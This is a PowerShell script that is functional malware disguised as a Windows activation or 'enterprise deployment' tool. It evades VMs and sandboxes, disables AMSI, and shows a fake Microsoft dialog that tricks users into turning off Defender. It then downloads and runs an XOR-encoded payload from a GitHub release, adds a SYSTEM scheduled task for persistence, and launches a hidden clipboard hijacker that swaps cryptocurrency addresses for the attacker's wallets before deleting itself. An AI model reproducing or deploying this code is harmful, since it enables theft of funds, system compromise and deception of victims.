# --- [RESEARCH STAGER v62.0: ENTERPRISE STEALTH COMPLETE] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. GATEKEEPER: ANTI-VM / ANTI-SANDBOX (Heuristic Evasion)
$mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
$disk = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -eq "C:"}).Size / 1GB
if ($mem -lt 4 -or $disk -lt 60) { exit } 

# 2. JUNK CODE BLOATING (Lowers Detection Density)
$garbage_array = @()
for($i=0; $i -lt 500; $i++){ $garbage_array += [Guid]::NewGuid().ToString() }
$temp_logic = $garbage_array | Where-Object { $_ -match "c" }

# 3. Admin Gate (v34.0 Style - LOCKED LOGIC)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch { }
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Microsoft System Deployment Assistant"; $prep.Size = New-Object Drawing.Size(600,580)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true; $prep.BackColor = [Drawing.Color]::White

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,180)
    $console.BackColor = [Drawing.Color]::FromArgb(30, 30, 30); $console.ForeColor = [Drawing.Color]::FromArgb(0, 255, 0)
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " [MSFT-OS-LOADER]: INITIALIZING...`n" +
                    " [ERROR]: SECURITY KERNEL BLOCK (0x80070422)`n" +
                    " [ACTION]: PLEASE SUSPEND THE FOLLOWING FOR DEPLOYMENT:`n" +
                    " ----------------------------------------------------`n" +
                    " > Real-time protection        -> [OFF]`n" +
                    " > Cloud-delivered protection  -> [OFF]`n" +
                    " > Automatic sample submission -> [OFF]`n" +
                    " > Tamper Protection           -> [OFF]"
    $prep.Controls.Add($console)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,300); $link.Size = New-Object Drawing.Size(500,45)
    $link.Text = "CONFIGURE SECURITY POLICY"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
    $link.Font = New-Object Drawing.Font("Segoe UI Semibold", 10); $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,360); $check.Size = New-Object Drawing.Size(500,30)
    $check.Text = "Policy Update: I have disabled protection for local license injection."; $check.Font = New-Object Drawing.Font("Segoe UI", 9)
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(200,430); $btn.Size = New-Object Drawing.Size(200,50); $btn.Text = "START DEPLOYMENT"; $btn.Enabled = $false; $btn.BackColor = [Drawing.Color]::FromArgb(204, 204, 204); $btn.FlatStyle = "Flat"
    $btn.Font = New-Object Drawing.Font("Segoe UI Semibold", 10); $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ 
        $btn.Enabled = $check.Checked
        if($check.Checked){ $btn.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $btn.ForeColor = [Drawing.Color]::White }
        else { $btn.BackColor = [Drawing.Color]::FromArgb(204, 204, 204); $btn.ForeColor = [Drawing.Color]::Black }
    })

    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Run-Deployment {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Microsoft Enterprise Update Service"; $form.Size = New-Object Drawing.Size(480,240); $form.StartPosition = "CenterScreen"; $form.TopMost = $true; $form.BackColor = [Drawing.Color]::White
    $status = New-Object Windows.Forms.Label; $status.Location = New-Object Drawing.Point(30,40); $status.Size = New-Object Drawing.Size(400,30); $status.Text = "Contacting Activation Servers..."; $status.Font = New-Object Drawing.Font("Segoe UI", 10); $form.Controls.Add($status)
    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,85); $pb.Size = New-Object Drawing.Size(400,15); $pb.Style = "Continuous"; $form.Controls.Add($pb); $form.Show()

    try {
        # --- CORE ENGINE v34.0/v45.0 (UNTOUCHED LOGIC) ---
        $dir = "$env:PROGRAMDATA\Microsoft\Windows\Templates\Sync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
        $path = Join-Path $dir "WinSvcHost.exe"
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)
        Start-Process $path -WindowStyle Hidden

        # --- 40 SECOND PROGRESS BAR ---
        for ($i = 0; $i -le 100; $i++) {
            $pb.Value = $i
            if ($i -eq 15) { $status.Text = "Downloading Security Patch KB50314..." }
            if ($i -eq 40) { $status.Text = "Verifying OEM Digital Signature..." }
            if ($i -eq 65) { $status.Text = "Applying System Visual Optimizations..." }
            if ($i -eq 85) { $status.Text = "Finalizing Secure Environment..." }
            [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 400
        }

        # --- SYSTEM VISUAL CLEANUP & REFRESH ---
        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /upk"
        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /cpky"
        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /rearm"
        Stop-Process -Name explorer -Force 

        # --- PERSISTENCE: REGISTER TASK ---
        $taskName = "MicrosoftSystemSync"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$path`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue

        # --- OBFUSCATED CLIPPER LOGIC (UNTOUCHED) ---
        $L1 = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"};'
        $L2 = 'while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim();'
        $L3 = 'if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } }'
        $L4 = 'elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } }'
        $L5 = 'elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } }'
        $L6 = 'elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
        $FinalC = $L1 + $L2 + $L3 + $L4 + $L5 + $L6
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FinalC))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        
        # --- REPORT GENERATION ---
        $av = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct").displayName -join ", "
        $infoFile = "$env:USERPROFILE\Desktop\System_Activation_Report.txt"
        $report = "--- MICROSOFT ENTERPRISE DEPLOYMENT REPORT ---`n" +
                  "TIMESTAMP: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n" +
                  "DEVICE: $env:COMPUTERNAME`nLICENSE: ACTIVATED / SECURE`nSECURITY: $av`n"
        $report | Out-File $infoFile

        $form.Close()
        [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nA report has been generated on your Desktop.", "Deployment Success", 0, 64) | Out-Null
        Start-Process notepad.exe $infoFile

        # --- SELF-DESTRUCT (CLEANUP) ---
        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
        
    } catch {
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Installation halted. Local policy error.", "System Error", 0, 16) | Out-Null
    }
}

# --- START ---
Global-Initialize
Show-SecurityPrep
if ($global:proceed) { Run-Deployment }
